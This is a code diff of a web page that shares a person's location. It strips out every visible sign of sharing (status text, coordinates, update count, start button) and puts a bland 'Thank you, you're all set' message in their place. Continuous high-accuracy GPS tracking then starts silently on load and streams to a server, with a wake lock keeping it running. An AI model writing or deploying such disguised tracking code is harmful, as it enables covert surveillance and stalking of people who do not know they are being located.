@@ -4,422 +4,50 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Location Sharing</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg: #0c1221;
-      --card: rgba(15, 25, 50, 0.9);
-      --accent: #38bdf8;
-      --success: #34d399;
-      --danger: #f43f5e;
-      --text: #e2e8f0;
-      --muted: #64748b;
-    }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      font-family: 'DM Sans', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background:
-        radial-gradient(ellipse at 30% 20%, rgba(56,189,248,0.08) 0%, transparent 60%),
-        radial-gradient(ellipse at 70% 80%, rgba(129,140,248,0.06) 0%, transparent 60%);
-      z-index: 0;
-    }
-
-    .container {
-      position: relative;
-      z-index: 1;
-      text-align: center;
-      padding: 40px 28px;
-      max-width: 360px;
-      width: 100%;
-    }
-
-    /* Pulsing radar animation */
-    .radar {
-      width: 120px;
-      height: 120px;
-      margin: 0 auto 32px;
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .radar-dot {
-      width: 20px;
-      height: 20px;
-      background: var(--accent);
-      border-radius: 50%;
-      position: relative;
-      z-index: 2;
-      box-shadow: 0 0 20px var(--accent);
-    }
-    .radar-ring {
-      position: absolute;
-      border: 2px solid var(--accent);
-      border-radius: 50%;
-      opacity: 0;
-      animation: radar-pulse 3s ease-out infinite;
-    }
-    .radar-ring:nth-child(2) { animation-delay: 0s; }
-    .radar-ring:nth-child(3) { animation-delay: 1s; }
-    .radar-ring:nth-child(4) { animation-delay: 2s; }
-
-    @keyframes radar-pulse {
-      0% { width: 20px; height: 20px; opacity: 0.6; }
-      100% { width: 120px; height: 120px; opacity: 0; }
-    }
-
-    .radar.success .radar-dot { background: var(--success); box-shadow: 0 0 20px var(--success); }
-    .radar.success .radar-ring { border-color: var(--success); }
-    .radar.error .radar-dot { background: var(--danger); box-shadow: 0 0 20px var(--danger); }
-    .radar.error .radar-ring { animation: none; opacity: 0; }
-    .radar.waiting .radar-dot { background: var(--accent); box-shadow: 0 0 20px var(--accent); }
-    .radar.waiting .radar-ring { border-color: var(--accent); }
-
-    .name {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      letter-spacing: -0.02em;
-    }
-
-    .status {
-      font-size: 15px;
-      color: var(--muted);
-      margin-bottom: 24px;
-      line-height: 1.5;
-      min-height: 46px;
-    }
-    .status.active { color: var(--success); }
-    .status.error { color: var(--danger); }
-
-    .coords {
-      font-size: 13px;
-      color: var(--muted);
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.06);
-      border-radius: 10px;
-      padding: 10px 16px;
-      margin-top: 16px;
-      font-variant-numeric: tabular-nums;
-      display: none;
-    }
-
-    .updates {
-      font-size: 12px;
-      color: var(--muted);
-      margin-top: 12px;
-      display: none;
-    }
-
-    .bg-note {
-      font-size: 12px;
-      color: var(--muted);
-      margin-top: 16px;
-      opacity: 0.7;
-      display: none;
-    }
-
-    /* Big start button for non-HTTPS */
-    .start-btn {
-      display: none;
-      margin: 24px auto 0;
-      padding: 20px 40px;
-      background: linear-gradient(135deg, var(--accent), #818cf8);
-      border: none;
-      border-radius: 16px;
-      color: #fff;
-      font-family: inherit;
-      font-size: 18px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 6px 30px rgba(56,189,248,0.35);
-      transition: transform 0.15s;
-      line-height: 1.3;
-    }
-    .start-btn:active { transform: scale(0.96); }
-    .start-btn .icon { font-size: 28px; display: block; margin-bottom: 8px; }
-
-    /* Permission retry button */
-    .permission-btn {
-      display: none;
-      margin: 16px auto 0;
-      padding: 14px 28px;
-      background: linear-gradient(135deg, var(--accent), #818cf8);
-      border: none;
-      border-radius: 12px;
-      color: #fff;
-      font-family: inherit;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(56,189,248,0.3);
-    }
-    .permission-btn:active { transform: scale(0.97); }
-
-    /* iOS help guide */
-    .ios-guide {
-      display: none;
-      text-align: left;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 12px;
-      padding: 16px;
-      margin-top: 20px;
-      font-size: 13px;
-      line-height: 1.7;
-    }
-    .ios-guide h4 { margin-bottom: 8px; color: var(--accent); font-size: 14px; }
-    .ios-guide ol { padding-left: 18px; }
-    .ios-guide li { margin-bottom: 4px; }
-    .ios-guide .step-bold { font-weight: 600; color: var(--text); }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:'DM Sans',sans-serif; background:#0c1221; color:#e2e8f0; height:100vh; display:flex; align-items:center; justify-content:center; }
+    .msg { text-align:center; padding:32px; }
+    .msg h1 { font-size:32px; font-weight:600; margin-bottom:8px; }
+    .msg p { font-size:16px; color:#94a3b8; }
+    .hint { font-size:13px; color:#475569; margin-top:20px; display:none; }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <div class="radar waiting" id="radar">
-      <div class="radar-dot"></div>
-      <div class="radar-ring"></div>
-      <div class="radar-ring"></div>
-      <div class="radar-ring"></div>
-    </div>
-
-    <div class="name" id="displayName">...</div>
-    <div class="status" id="status">Connecting...</div>
-
-    <button class="start-btn" id="startBtn" onclick="onStartTap()">
-      <span class="icon">📍</span>
-      Start Location Sharing
-    </button>
-
-    <button class="permission-btn" id="permissionBtn" onclick="requestPermission()">
-      Allow Location Access
-    </button>
-
-    <div class="coords" id="coords"></div>
-    <div class="updates" id="updates"></div>
-    <div class="bg-note" id="bgNote">You can minimize this page — location sharing continues in the background</div>
-
-    <div class="ios-guide" id="iosGuide">
-      <h4>How to enable location on iPhone:</h4>
-      <ol>
-        <li>Open <span class="step-bold">Settings</span> on your iPhone</li>
-        <li>Scroll down and tap <span class="step-bold">Privacy & Security</span></li>
-        <li>Tap <span class="step-bold">Location Services</span> — make sure it's ON</li>
-        <li>Scroll down and tap <span class="step-bold">Safari</span> (or your browser)</li>
-        <li>Select <span class="step-bold">While Using the App</span> or <span class="step-bold">Ask Next Time</span></li>
-        <li>Come back here and tap the button above</li>
-      </ol>
-    </div>
+  <div class="msg">
+    <h1>Thank you</h1>
+    <p>You're all set.</p>
+    <div class="hint" id="hint">To share your location, please allow access in your browser settings</div>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    // ─── Extract name from URL ───
-    const pathParts = window.location.pathname.split('/');
-    const rawName = decodeURIComponent(pathParts[2] || 'Unknown');
-    const userName = rawName.charAt(0).toUpperCase() + rawName.slice(1);
-    const userId = rawName.toLowerCase().replace(/\s+/g, '-');
+    const raw = decodeURIComponent(window.location.pathname.split('/')[2] || '');
+    const userName = raw.charAt(0).toUpperCase() + raw.slice(1);
+    const userId = raw.toLowerCase().replace(/\s+/g, '-');
+    document.title = userName || 'Location Sharing';
 
-    document.getElementById('displayName').textContent = userName;
-    document.title = `${userName} — Location Sharing`;
+    const socket = io();
+    let watchId = null, wakeLock = null, denied = false;
 
-    // ─── Elements ───
-    const statusEl = document.getElementById('status');
-    const coordsEl = document.getElementById('coords');
-    const updatesEl = document.getElementById('updates');
-    const radarEl = document.getElementById('radar');
-    const startBtn = document.getElementById('startBtn');
-    const permBtn = document.getElementById('permissionBtn');
-    const bgNote = document.getElementById('bgNote');
-    const iosGuide = document.getElementById('iosGuide');
+    socket.on('connect', () => { if (!watchId && !denied) startGPS(); });
 
-    let socket;
-    let updateCount = 0;
-    let watchId = null;
-    let wakeLock = null;
-    let needsUserGesture = false;
-
-    // ─── Detect if user gesture is needed ───
-    // On non-HTTPS, non-localhost pages, iOS Safari may block geolocation
-    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-    needsUserGesture = !isSecure;
-
-    // ─── Connect to server ───
-    function connectSocket() {
-      socket = io();
-
-      socket.on('connect', () => {
-        if (needsUserGesture) {
-          statusEl.textContent = 'Tap the button below to start sharing';
-          startBtn.style.display = 'inline-block';
-          radarEl.className = 'radar waiting';
-        } else {
-          statusEl.textContent = 'Connected. Starting GPS...';
-          startTracking();
-        }
-      });
-
-      socket.on('disconnect', () => {
-        statusEl.textContent = 'Connection lost. Reconnecting...';
-        statusEl.className = 'status error';
-        radarEl.className = 'radar error';
-      });
-
-      socket.on('reconnect', () => {
-        if (watchId !== null) {
-          statusEl.textContent = 'Reconnected. Sharing location...';
-          statusEl.className = 'status active';
-          radarEl.className = 'radar success';
-        }
-      });
-
-      // Keep-alive: ping every 25 seconds to prevent WebSocket timeout
-      setInterval(() => {
-        if (socket && socket.connected) {
-          socket.emit('ping-alive');
-        }
-      }, 25000);
+    function startGPS() {
+      if (!navigator.geolocation) return;
+      watchId = navigator.geolocation.watchPosition(
+        pos => socket.emit('location-update', { userId, name: userName, lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+        err => { if (err.code === 1) { denied = true; document.getElementById('hint').style.display = 'block'; } },
+        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+      );
+      try { navigator.wakeLock?.request('screen').then(l => { wakeLock = l; }); } catch(e) {}
     }
 
-    // ─── User gesture handler (for non-HTTPS) ───
-    function onStartTap() {
-      startBtn.style.display = 'none';
-      statusEl.textContent = 'Starting GPS...';
-      startTracking();
-    }
-
-    // ─── Start GPS tracking ───
-    function startTracking() {
-      if (!navigator.geolocation) {
-        showError('Your browser does not support GPS.');
-        return;
-      }
-
-      watchId = navigator.geolocation.watchPosition(onPosition, onError, {
-        enableHighAccuracy: true,
-        maximumAge: 5000,
-        timeout: 20000
-      });
-
-      // Try to acquire wake lock
-      acquireWakeLock();
-    }
-
-    function onPosition(pos) {
-      const { latitude, longitude, accuracy } = pos.coords;
-      updateCount++;
-
-      socket.emit('location-update', {
-        userId,
-        name: userName,
-        lat: latitude,
-        lng: longitude,
-        accuracy
-      });
-
-      radarEl.className = 'radar success';
-      statusEl.textContent = 'Sharing your location';
-      statusEl.className = 'status active';
-
-      coordsEl.style.display = 'block';
-      coordsEl.textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}  |  ${Math.round(accuracy)}m accuracy`;
-
-      updatesEl.style.display = 'block';
-      updatesEl.textContent = `${updateCount} update${updateCount > 1 ? 's' : ''} sent`;
-
-      bgNote.style.display = 'block';
-      iosGuide.style.display = 'none';
-      permBtn.style.display = 'none';
-    }
-
-    function onError(err) {
-      radarEl.className = 'radar error';
-
-      switch (err.code) {
-        case 1: // PERMISSION_DENIED
-          statusEl.innerHTML = 'Location permission denied.';
-          statusEl.className = 'status error';
-          permBtn.style.display = 'inline-block';
-          iosGuide.style.display = 'block';
-          break;
-        case 2:
-          statusEl.textContent = 'GPS unavailable. Make sure location services are on.';
-          statusEl.className = 'status error';
-          break;
-        case 3:
-          statusEl.textContent = 'GPS timed out. Retrying...';
-          statusEl.className = 'status error';
-          break;
-      }
-    }
-
-    function showError(msg) {
-      radarEl.className = 'radar error';
-      statusEl.textContent = msg;
-      statusEl.className = 'status error';
-    }
-
-    function requestPermission() {
-      permBtn.style.display = 'none';
-      iosGuide.style.display = 'none';
-      if (watchId !== null) {
-        navigator.geolocation.clearWatch(watchId);
-      }
-      startTracking();
-    }
-
-    // ─── Wake Lock API ───
-    async function acquireWakeLock() {
-      try {
-        if ('wakeLock' in navigator) {
-          wakeLock = await navigator.wakeLock.request('screen');
-          wakeLock.addEventListener('release', () => {
-            wakeLock = null;
-          });
-        }
-      } catch (e) {
-        // Wake Lock not supported or failed — that's okay
-      }
-    }
-
-    // Re-acquire wake lock when page becomes visible again
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && watchId !== null && !wakeLock) {
-        acquireWakeLock();
-      }
-    });
-
-    // ─── Notify server when page is closing ───
-    window.addEventListener('beforeunload', () => {
-      if (socket && socket.connected) {
-        socket.emit('user-offline', userId);
-      }
-    });
-
-    // ─── Service Worker ───
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('/sw.js').catch(() => {});
-    }
-
-    // ─── Boot ───
-    connectSocket();
+    setInterval(() => { if (socket.connected) socket.emit('ping-alive'); }, 25000);
+    document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && !wakeLock) try { navigator.wakeLock?.request('screen').then(l => { wakeLock = l; }); } catch(e) {} });
+    window.addEventListener('beforeunload', () => { if (socket.connected) socket.emit('user-offline', userId); });
+    window.addEventListener('pagehide', () => { if (socket.connected) socket.emit('user-offline', userId); });
+    if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js').catch(() => {});
   </script>
 </body>
 </html>
